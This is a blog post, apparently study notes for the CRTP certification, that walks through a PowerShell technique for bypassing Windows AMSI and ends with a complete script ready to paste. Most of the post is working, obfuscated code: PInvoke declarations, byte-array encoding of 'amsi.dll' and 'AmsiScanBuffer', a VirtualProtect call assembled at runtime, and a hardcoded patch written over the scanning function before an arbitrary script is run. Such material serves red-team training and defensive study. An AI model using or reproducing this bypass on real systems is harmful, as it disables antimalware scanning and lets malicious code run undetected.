---
title: Bypass AMSI Like a King
date: 2024-06-20 05:00:00 +0800
categories: [Cert, CRTP]
tags: [Cert]     # TAG names should always be lowercase
description: Describes how to bypass the Anti-Malware Scan Interface (AMSI) using PowerShell.
---

# Summary

This document describes how to bypass the Anti-Malware Scan Interface (AMSI) using PowerShell. It involves loading the `amsi.dll` into memory, finding the memory address of the `AmsiScanBuffer` function, and changing the memory protection to allow writing and executing code. Shellcode is then injected, and a PowerShell script is run. This method is mainly used for cybersecurity research and testing purposes and should be used responsibly.

# 1. Defining a C# Class with PInvoke Methods

```jsx
$Win32 = @"
using System.Runtime.InteropServices;
using System;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
```

In PowerShell, you can't directly call functions from Windows DLLs like `kernel32.dll` or `user32.dll`. These DLLs contain functions written in languages like C or C++. However, you can use a feature called PInvoke (Platform Invocation Services) to call these functions from PowerShell. PInvoke allows managed code (like C#) to call unmanaged functions.

**Explanation:**

- This part of the code defines a C# class `Win32` using a here-string (`@" ... "@`) in PowerShell.
- This class contains three methods: `GetProcAddress`, `LoadLibrary`, and `VirtualProtect`.
- These methods use the `[DllImport]` attribute, which tells the .NET runtime to look for these functions in the specified DLLs (`kernel32.dll` in this case).
- `GetProcAddress` retrieves the address of an exported function from a DLL.
- `LoadLibrary` loads a DLL into the process's address space.
- `VirtualProtect` changes the protection on a region of memory.

---

# 2. Loading `amsi.dll`

```jsx
$nowhere = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($nowhere))

```

The script aims to interact with functions from `amsi.dll`, which is a Windows DLL containing functions related to the Anti-Malware Scan Interface (AMSI). Before you can use functions from a DLL, you need to load the DLL into memory. The `LoadLibrary` function from `kernel32.dll` is used for this purpose.

**Explanation:**

- This part initializes a byte array `$nowhere` representing the ASCII characters of the string "amsi.dll".
- It then calls the `LoadLibrary` method from the `Win32` class to load `amsi.dll` into memory.
- The result, which is a handle to the loaded DLL, is stored in the variable `$LoadLibrary`.

---

# 3. Getting the Address of `AmsiScanBuffer`

```jsx
$somewhere = [Byte[]](0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$notaddress = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($somewhere))
```

The script needs to find the memory address of the `AmsiScanBuffer` function inside `amsi.dll`. This is necessary to modify or intercept the behavior of the `AmsiScanBuffer` function later in the script. The `GetProcAddress` function from `kernel32.dll` is used to retrieve the address of a function within a loaded DLL.

**Explanation:**

- This part initializes a byte array `$somewhere` representing the ASCII characters of the string "AmsiScanBuffer".
- It calls the `GetProcAddress` method from the `Win32` class to retrieve the address of the `AmsiScanBuffer` function within `amsi.dll`.
- The resulting memory address is stored in the variable `$notaddress`.

---

# 4. Changing Memory Protection

```
$notp = 0
$replace = 'VirtualProtec'
[Win32]::('{0}{1}' -f $replace,$c)($notaddress, [uint32]5, 0x40, [ref]$notp)
```

**Explanation:**

- This part sets up a variable `$notp` to hold the old protection value.
- It constructs the name of the `VirtualProtect` method dynamically using the variable `$replace`.
- Then, it calls the dynamically constructed method to change the memory protection of the `AmsiScanBuffer` function to allow writing and executing code.

---

# 5. Injecting Shellcode

```
$stopitplease = [Byte[]] (0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
$marshalClass = [System.Runtime.InteropServices.Marshal]
$marshalClass::Copy($stopitplease, 0, $notaddress, $stopitplease.Length)
```

---

# 6. Executing Your PowerShell Script

```
Unblock-File -Path .\malas.ps1
. .\malas.ps1
```

**Explanation:**

- This part of the code unblocks the script file `malas.ps1`, if it was blocked for security reasons.
- Then, it executes the `malas.ps1` script by dot-sourcing it (`.` operator followed by the script name). This runs the script in the current PowerShell session.

---

# 7. Final Code

```jsx
$c = 't'
$Win32 = @"
using System.Runtime.InteropServices;
using System;
public class Win32 {[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtec$c(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$nowhere = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($nowhere))
$somewhere = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$notaddress = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($somewhere))
$notp = 0
$replace = 'VirtualProtec'
[Win32]::('{0}{1}' -f $replace,$c)($notaddress, [uint32]5, 0x40, [ref]$notp)
$stopitplease = [Byte[]] (0xB8, 0x57, 0x00, 0x17, 0x20, 0x35, 0x8A, 0x53, 0x34, 0x1D, 0x05, 0x7A, 0xAC, 0xE3, 0x42, 0xC3)
$marshalClass = [System.Runtime.InteropServices.Marshal]
$marshalClass::Copy($stopitplease, 0, $notaddress, $stopitplease.Length)

Run your powershell here
Unblock-File -Path .\malas.ps1
. .\malas.ps1
```